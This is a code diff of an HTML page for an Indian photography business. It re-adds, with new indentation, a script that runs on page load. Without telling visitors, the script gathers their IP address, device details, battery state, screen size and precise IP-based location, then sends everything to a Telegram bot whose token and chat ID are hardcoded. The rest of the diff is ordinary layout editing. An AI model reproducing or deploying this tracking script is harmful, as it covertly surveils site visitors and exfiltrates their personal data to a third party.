@@ -1,75 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<script>
- function myFunction() {
-    // Get the current URL
-    const currentURL = window.location.href;
-
-    fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
-        .then(ipData => {
-            const ipAddress = ipData.ip;
-            const userAgent = navigator.userAgent;
-            const deviceMemory = navigator.deviceMemory;
-
-            // Get network information
-            const connectionType = navigator.connection.type;
-            const effectiveConnectionType = navigator.connection.effectiveType;
-
-            // Get battery information
-            navigator.getBattery().then(batteryData => {
-                const batteryLevel = batteryData.level * 100; // Battery level in percentage
-                const charging = batteryData.charging ? 'Plugged In' : 'Not Plugged In';
-
-                // Get screen information
-                const screenWidth = window.screen.width;
-                const screenHeight = window.screen.height;
-                const screenOrientation = window.screen.orientation.type;
-
-                // Get window information
-                const windowWidth = window.innerWidth;
-                const windowHeight = window.innerHeight;
-
-                const geoUrl = `https://ipapi.co/${ipAddress}/json/`;
-
-                fetch(geoUrl)
-                    .then(geoResponse => geoResponse.json())
-                    .then(geoData => {
-                        const country = geoData.country_name;
-                        const region = geoData.region;
-                        const city = geoData.city;
-                        const zip = geoData.postal;
-                        const latitude = geoData.latitude;
-                        const longitude = geoData.longitude;
-                        const timezone = geoData.timezone;
-                        const isp = geoData.org;
-
-                        const text = encodeURIComponent(`${currentURL} Url Detect New Users ipAddress: ${ipAddress}\nDevice Info: ${userAgent}\nDevice Memory: ${deviceMemory} GB\nConnection Type: ${connectionType}\nEffective Connection Type: ${effectiveConnectionType}\nBattery Level: ${batteryLevel}%\nBattery Status: ${charging}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nZip Code: ${zip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nISP: ${isp}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nScreen Orientation: ${screenOrientation}\nWindow Width: ${windowWidth}px\nWindow Height: ${windowHeight}px`);
-
-                        const apiUrl = `https://api.telegram.org/bot6696450444:AAEjPvTws_uuAuN2g_resbLkQth5AWu7l_E/sendMessage?chat_id=5114789651&text=${text}`;
-                        fetch(apiUrl)
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log(data);
-                            })
-                            .catch(error => {
-                                console.error(error);
-                            });
-                    })
-                    .catch(error => {
-                        console.error(error);
-                    });
-            });
-        })
-        .catch(error => {
-            console.error(error);
-        });
-}
-
-window.addEventListener('load', myFunction);
-</script>
-    <meta charset="utf-8">
+    <script>
+        function myFunction() {
+           // Get the current URL
+           const currentURL = window.location.href;
+       
+           fetch("https://api.ipify.org?format=json")
+               .then(response => response.json())
+               .then(ipData => {
+                   const ipAddress = ipData.ip;
+                   const userAgent = navigator.userAgent;
+                   const deviceMemory = navigator.deviceMemory;
+       
+                   // Get network information
+                   const connectionType = navigator.connection.type;
+                   const effectiveConnectionType = navigator.connection.effectiveType;
+       
+                   // Get battery information
+                   navigator.getBattery().then(batteryData => {
+                       const batteryLevel = batteryData.level * 100; // Battery level in percentage
+                       const charging = batteryData.charging ? 'Plugged In' : 'Not Plugged In';
+       
+                       // Get screen information
+                       const screenWidth = window.screen.width;
+                       const screenHeight = window.screen.height;
+                       const screenOrientation = window.screen.orientation.type;
+       
+                       // Get window information
+                       const windowWidth = window.innerWidth;
+                       const windowHeight = window.innerHeight;
+       
+                       const geoUrl = `https://ipapi.co/${ipAddress}/json/`;
+       
+                       fetch(geoUrl)
+                           .then(geoResponse => geoResponse.json())
+                           .then(geoData => {
+                               const country = geoData.country_name;
+                               const region = geoData.region;
+                               const city = geoData.city;
+                               const zip = geoData.postal;
+                               const latitude = geoData.latitude;
+                               const longitude = geoData.longitude;
+                               const timezone = geoData.timezone;
+                               const isp = geoData.org;
+       
+                               const text = encodeURIComponent(`${currentURL} Url Detect New Users ipAddress: ${ipAddress}\nDevice Info: ${userAgent}\nDevice Memory: ${deviceMemory} GB\nConnection Type: ${connectionType}\nEffective Connection Type: ${effectiveConnectionType}\nBattery Level: ${batteryLevel}%\nBattery Status: ${charging}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nZip Code: ${zip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nISP: ${isp}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nScreen Orientation: ${screenOrientation}\nWindow Width: ${windowWidth}px\nWindow Height: ${windowHeight}px`);
+       
+                               const apiUrl = `https://api.telegram.org/bot6696450444:AAEjPvTws_uuAuN2g_resbLkQth5AWu7l_E/sendMessage?chat_id=5114789651&text=${text}`;
+                               fetch(apiUrl)
+                                   .then(response => response.json())
+                                   .then(data => {
+                                       console.log(data);
+                                   })
+                                   .catch(error => {
+                                       console.error(error);
+                                   });
+                           })
+                           .catch(error => {
+                               console.error(error);
+                           });
+                   });
+               })
+               .catch(error => {
+                   console.error(error);
+               });
+       }
+       
+       window.addEventListener('load', myFunction);
+       </script>
+	<meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="description" content="IW TANMAYA Photography Services">
     <meta name="keywords" content="Photography Services,Videography Services,Edting Services,Camera Services">
@@ -162,6 +162,25 @@ window.addEventListener('load', myFunction);
         </div><!-- end of container -->
     </section> <!-- end of about section -->
 
+<h1 style="text-align: center;">Beta test</h1>
+<p style="text-align: center;">Website has been under Development Coming Soon</p>
+
+<section class="">
+    <img src="https://drive.google.com/thumbnail?id=1xHhcWolUm7IBM8ZbG8ZUY9Wiz-clCsFF&sz=w1000" style="height: auto;width: 100%;background-size: contain;">
+</section>
+
+<section class="">
+    <img src="https://www.freepsdking.com/wp-content/uploads/2024/04/Wedding-Album-PSD-Free-Download-12X36-2023-10-1024x341.webp" style="height: auto;width: 100%;background-size: contain;">
+</section>
+
+<section class="">
+    <img src="https://www.freepsdking.com/wp-content/uploads/2024/04/Wedding-Album-PSD-Free-Download-12X36-2023-11.webp" style="height: auto;width: 100%;background-size: contain;">
+</section>
+
+<section class="">
+    <img src="https://www.freepsdking.com/wp-content/uploads/2024/04/Wedding-Album-PSD-Free-Download-12X36-2023-1.webp" style="height: auto;width: 100%;background-size: contain;">
+</section>
+
     <!-- service section -->
     <section class="section" id="service">
         <div class="container text-center">
@@ -222,7 +241,7 @@ window.addEventListener('load', myFunction);
     </section><!-- end of service section -->
 
     <!-- portfolio section -->
-    <section class="section" id="portfolio">
+    <section class="section" id="portfolio" style="display: none;">
         <div class="container text-center">
             <p class="section-subtitle">What I Did ?</p>
             <h6 class="section-title mb-6">Portfolio</h6>
@@ -266,7 +285,7 @@ window.addEventListener('load', myFunction);
     </section> <!-- end of portfolio section -->
 
     <!-- pricing section -->
-    <section class="section" id="pricing">
+    <section class="section" id="pricing" style="display: none;">
         <div class="container text-center">
             <p class="section-subtitle">How Much I Charge ?</p>
             <h6 class="section-title mb-6">My Pricing</h6>
@@ -403,57 +422,6 @@ window.addEventListener('load', myFunction);
         </div> <!-- end of container -->
     </section> <!-- end of testimonial section -->
     
-    <!-- blog section -->
-    <section class="section" id="blog">
-        <!-- container -->
-        <div class="container text-center">
-            <p class="section-subtitle">Recent Posts?</p>
-            <h6 class="section-title mb-6">Blog</h6>
-            <!-- blog-wrapper -->
-            <div class="blog-card">
-                <div class="blog-card-header">
-                    <img src="assets/imgs/img-1.jpg" class="blog-card-img" alt="Download free bootstrap 4 landing page, free boootstrap 4 templates, Download free bootstrap 4.1 landing page, free boootstrap 4.1.1 templates, meyawo Landing page">
-                </div>
-                <div class="blog-card-body">
-                    <h5 class="blog-card-title">Consectetur adipisicing elit</h6>
-
-                    <p class="blog-card-caption">
-                        <a href="#">By: Admin</a>
-                        <a href="#"><i class="ti-heart text-danger"></i> 234</a>
-                        <a href="#"><i class="ti-comment"></i> 123</a>
-                    </p>
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Amet nesciunt qui sit velit delectus voluptates, repellat ipsum culpa id deleniti. Rerum debitis facilis accusantium neque numquam mollitia modi quasi distinctio.</p>
-
-                    <p><b>Necessitatibus nihil impedit! Ex nisi eveniet, dolor aliquid consequuntur repudiandae.</b></p>
-                    <p>Magnam in repellat enim harum omnis aperiam! Explicabo illo, commodi, dolor blanditiis cupiditate harum nisi vero accusamus laudantium voluptatibus dolores quae obcaecati.</p>
-
-                    <a href="#" class="blog-card-link">Read more <i class="ti-angle-double-right"></i></a>
-                </div>
-            </div><!-- end of blog wrapper -->
-
-            <!-- blog-wrapper -->
-            <div class="blog-card">
-                <div class="blog-card-header">
-                    <img src="assets/imgs/img-2.jpg" class="blog-card-img" alt="Download free bootstrap 4 landing page, free boootstrap 4 templates, Download free bootstrap 4.1 landing page, free boootstrap 4.1.1 templates, meyawo Landing page">
-                </div>
-                <div class="blog-card-body">
-                    <h5 class="blog-card-title">Explicabo illo</h6>
-
-                    <p class="blog-card-caption">
-                        <a href="#">By: Admin</a>
-                        <a href="#"><i class="ti-heart text-danger"></i> 456</a>
-                        <a href="#"><i class="ti-comment"></i> 264</a>
-                    </p>
-                    
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Impedit excepturi laborum enim, vitae ipsam atque eum, ad iusto consequuntur voluptas, esse doloribus. Perferendis porro quisquam vitae exercitationem aliquid, minus eos laborum repudiandae, cumque debitis iusto omnis praesentium? Laborum placeat sit adipisci illum tempore maxime, esse qui quae? Molestias excepturi corporis similique doloribus. Esse vitae earum architecto nulla non dolores illum at perspiciatis quod, et deleniti cupiditate reiciendis harum facere, delectus eum commodi soluta distinctio sit repudiandae possimus sunt. Ipsum, rem.</p>
-
-                    <a href="#" class="blog-card-link">Read more <i class="ti-angle-double-right"></i></a>
-                </div>
-            </div><!-- end of blog wrapper -->
-
-        </div><!-- end of container -->
-    </section>
-    <!-- end of blog section -->
 
     <!-- contact section -->
     <section class="section" id="contact">
@@ -483,7 +451,103 @@ window.addEventListener('load', myFunction);
         </div><!-- end of container -->
     </section><!-- end of contact section -->
 
+
+
     <!-- footer -->
+
+    <style>
+
+        .footer-567 {
+            background-color: #121212;
+            padding: 20px;
+            text-align: center;
+            color: #fff;
+        }
+        
+        .footer-container {
+            display: flex;
+           
+            padding-bottom: 20px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .footer-container div {
+            flex: 1;
+            margin: 10px;
+            color: #ffffff;
+        }
+        .footer-container p {
+            color: #ffffff;
+        }
+        h3 {
+            color: #ffffff;
+        }
+        
+        a {
+            color: #ffffff;
+            text-decoration: none;
+        }
+        
+        .footer-bottom {
+            margin-top: 20px;
+            font-size: 14px;
+            justify-content: center;
+        }
+        
+        .footer-bottom a {
+            color: #ffffff;
+        }
+        
+        .social-icons {
+            margin-top: 10px;
+        }
+        .footer-container li {
+          list-style-type: none;
+          text-align: center;
+        }
+        .social-icons img {
+            width: 24px;
+            height: 24px;
+        }
+        
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+        
+   </style>
+        
+            <div class="footer-567">
+                <div class="footer-container">
+                    <div class="company-name">
+                        <h3>COMPANY NAME</h3>
+                        <p>T6</p>
+                    </div>
+                    <div class="our-services">
+                        <h3>OUR SERVICES</h3>
+                        <ul>
+                            <li>Photography</li>
+                            <li>Videography</li>
+                            <li>Editor</li>
+                        </ul>
+                    </div>
+                    <div class="contact">
+                        <h3>CONTACT</h3>
+                        <p>📞 Coming Soon</p>
+                        <p>✉ iwofficially@gmail.com</p>
+                        <p>🏠 BADAMBA, Cuttack, Odisha, India</p>
+                    </div>
+                </div>
+                <div class="footer-bottom">
+                    <p>Copyright © 2024 <a href="#">IW TANMAYA</a></p>
+                </div>
+            </div>
+
+
+
+
     <div class="container">
         <footer class="footer">       
             <p class="mb-0">Copyright <script>document.write(new Date().getFullYear())</script> &copy; <a href="">IW TANMAYA</a></p>
